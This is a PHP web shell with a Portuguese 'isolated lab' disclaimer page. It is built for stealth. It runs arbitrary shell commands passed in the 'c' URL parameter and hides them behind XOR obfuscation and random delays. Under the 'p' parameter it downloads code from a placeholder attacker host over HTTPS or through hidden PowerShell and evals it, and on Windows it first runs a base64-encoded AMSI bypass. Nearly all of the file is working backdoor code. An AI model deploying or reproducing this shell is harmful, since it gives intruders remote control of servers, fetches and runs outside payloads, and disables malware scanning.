<?php
/**
 * vulnerable-2026-max-stealth.php
 * Versão máxima de evasão possível em PHP puro (2026 lab)
 * NÃO é indetectável em ambiente real atualizado
 * USO SOMENTE EM VMs ISOLADAS QUE VOCÊ CONTROLA
 */

@error_reporting(0); @set_time_limit(0); @ignore_user_abort(true);

$is_debug = isset($_GET['d']) && $_GET['d'] === '1';
$is_win   = stripos(PHP_OS, 'WIN') !== false;

// Ofuscação XOR dupla (chave 42)
function ox($s, $k=42) { $o=''; for($i=0;$i<strlen($s);$i++) $o .= chr(ord($s[$i]) ^ $k); return $o; }
function dox($o) { return ox($o); }

// Delay com jitter (anti-timing)
function jd() { usleep(rand(150000, 850000) + rand(0, 300000)); }

// Reconstrução de string fragmentada
function frag($s) { return implode('', explode(' ', $s)); }

// Payload URL (ofuscada)
$p_url_obf = ox('https://SEU_IP:8443/m-o.php'); // MUDE PARA SEU IP/PORTA REAL (use HTTPS)

// ================================================
// RCE básico (com evasão mínima)
// ================================================
if (isset($_GET['c']) && trim($_GET['c']) !== '') {
    jd();
    $c = dox(ox(trim($_GET['c'])));
    $c = frag($c);

    $out = '';
    $m = [['system',1],['passthru',1],['exec',0],['shell_exec',0],['popen',0],['proc_open',0]];
    foreach ($m as [$f,$ob]) {
        if (!function_exists($f)) continue;
        if ($ob) ob_start();
        if ($f=='exec')     { exec($c.' 2>&1',$o); $out=implode("\n",$o); }
        elseif ($f=='popen') { $h=popen($c.' 2>&1','r'); $out=stream_get_contents($h); pclose($h); }
        elseif ($f=='proc_open') {
            $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $p=proc_open($c,$d,$pipes); $out=stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
            fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);
        }
        else $f($c.' 2>&1');
        $out = $ob ? ob_get_clean() : $out;
        if ($out) break;
    }

    if ($is_debug) echo "<pre>".htmlspecialchars($c)."\n\n".htmlspecialchars($out?:'no output')."</pre>";
    else { header('Content-Type: text/plain'); echo "200"; }
    exit;
}

// ================================================
// Payload loader (máxima evasão possível em PHP)
// ================================================
if (isset($_GET['p']) && $_GET['p']==='1') {
    jd();
    $url = dox($p_url_obf);

    $c = null;

    // 1. file_get_contents + headers fake
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nReferer: https://www.google.com/\r\n"]]);
        $c = @file_get_contents($url, false, $ctx);
    }

    // 2. curl com mais headers e timeout jitter
    if (!$c && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => rand(8,15),
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            CURLOPT_REFERER        => 'https://www.google.com/',
            CURLOPT_HTTPHEADER     => ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8']
        ]);
        $c = curl_exec($ch); curl_close($ch);
    }

    // 3. powershell (Windows) com ofuscação
    if (!$c && $is_win) {
        $ps = dox(ox('powershell -nop -w hidden -c "IWR -Uri \'$url\' -UseBasicParsing -UserAgent \'Mozilla/5.0\'"'));
        $c = @shell_exec(frag($ps));
    }

    if ($c && strlen($c) > 150) {
        if ($is_win) {
            // AMSI bypass mais ofuscado (concatenação + base64)
            $ab = 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikuU2V0VmFsdWQoJG51bGwsJHRydWUp';
            $ab = str_split($ab, 50); $ab = implode("'.'", $ab);
            @shell_exec("powershell -nop -c \"& ([scriptblock]::Create('[$ab]'))\" 2>nul");
        }
        eval('?>' . $c);
    }

    if (!$is_debug) { http_response_code(rand(200,204)); exit; }
    else echo "<pre>URL: ".htmlspecialchars($url)."\nLen: ".($c?strlen($c):'fail')."</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Demo Lab</title>
<style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;} pre{background:#111;padding:15px;border:1px solid #0f0;}</style>
</head>
<body>
<h1>Ambiente de Estudo Isolado</h1>
<div style="color:#f44;font-weight:bold;border:2px solid #f44;padding:15px;margin:20px 0;">
    APENAS VMs ISOLADAS – NUNCA NA INTERNET REAL
</div>

<h2>Testes</h2>
<pre>
?c=whoami
?c=ipconfig
?p=1          ← tenta payload (handler deve estar rodando)
?d=1          ← debug
</pre>

<p style="color:#555;font-size:0.9em;">
    Estude apenas em ambiente controlado. Bypass real exige loaders custom (Rust/C#/Go) + syscalls diretas.
</p>
</body>
</html>
